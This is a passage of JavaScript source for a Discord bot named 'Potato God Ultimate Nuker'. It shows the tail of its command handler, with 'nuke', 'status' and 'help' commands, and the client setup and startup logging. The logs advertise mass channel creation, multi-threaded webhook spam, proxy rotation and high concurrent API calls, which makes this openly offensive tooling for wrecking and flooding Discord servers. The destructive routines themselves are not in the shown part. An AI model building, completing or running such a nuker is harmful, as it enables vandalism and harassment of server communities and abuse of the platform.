        } else if (command === 'status') {
            message.reply(`🟢 Potato God Nuker is online.\n🔄 Nuking: ${this.core.isNuking ? 'YES' : 'NO'}\n📡 Guild: ${this.core.currentGuild?.name || 'None'}`);
        } else if (command === 'help') {
            message.reply(`**Potato God Nuker Commands:**\n\`${CONFIG.PREFIX} nuke\` - Start full nuke on current server\n\`${CONFIG.PREFIX} status\` - Check bot status\n\`${CONFIG.PREFIX} help\` - Show this message`);
        }
    }
}

// ========================== CLIENT SETUP & MAIN ==========================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildEmojisAndStickers
    ]
});

const core = new NuclearCore(client);
const commandHandler = new CommandHandler(client, core);
const memoryManager = new MemoryManager();
const watchdog = new HeartbeatWatchdog(client);
const statusRotator = new StatusRotator(client);

client.once('ready', () => {
    logger.info(`✅ Logged in as ${client.user.tag} | ID: ${client.user.id}`);
    logger.info(`🔥 POTATO GOD ULTIMATE NUKER v${CONFIG.VERSION} (${GLOBALS.BUILD}) 🔥`);
    logger.info(`📦 Memory limit: ${CONFIG.MEMORY_LIMIT_MB} MB`);
    logger.info(`🧵 Max threads: ${CONFIG.MAX_WORKER_THREADS}`);
    logger.info(`🌐 Proxy rotation: ${CONFIG.ENABLE_PROXY_ROTATION ? 'ENABLED' : 'DISABLED'}`);
    logger.info(`💀 Channels to create: ${CONFIG.CHANNEL_CREATION_COUNT}`);
    logger.info(`💥 Spam rounds: ${CONFIG.SPAM_ROUNDS} x ${CONFIG.WEBHOOK_THREADS} threads`);
    logger.info(`⚡ Max concurrent API: ${CONFIG.MAX_CONCURRENT_API_CALLS}`);
    logger.info(`🔧 Command prefix: ${CONFIG.PREFIX}`);
    
    if (CONFIG.WATCHDOG_ENABLED) watchdog.start();
    statusRotator.start();
});

client.on('messageCreate', (msg) => commandHandler.handle(msg));
client.on('error', (err) => logger.error(`Client error: ${err.message}`));
client.on('warn', (warn) => logger.warn(`Client warning: ${warn}`));

process.on('uncaughtException', (err) => {
    logger.error(`Uncaught Exception: ${err.stack}`);
    if (CONFIG.AUTO_RESTART_ON_CRASH) process.exit(1);
});
process.on('unhandledRejection', (err) => {
    logger.error(`Unhandled Rejection: ${err}`);
});
process.on('SIGINT', () => {
    logger.info('Shutting down Potato God Nuker...');
    memoryManager.stop();
    if (watchdog) watchdog.stop();
    if (statusRotator) statusRotator.stop();
    client.destroy();
    process.exit(0);
});

client.login(CONFIG.TOKEN).catch(err => {
    logger.error(`FATAL: Cannot login - ${err.message}`);
    process.exit(1);
});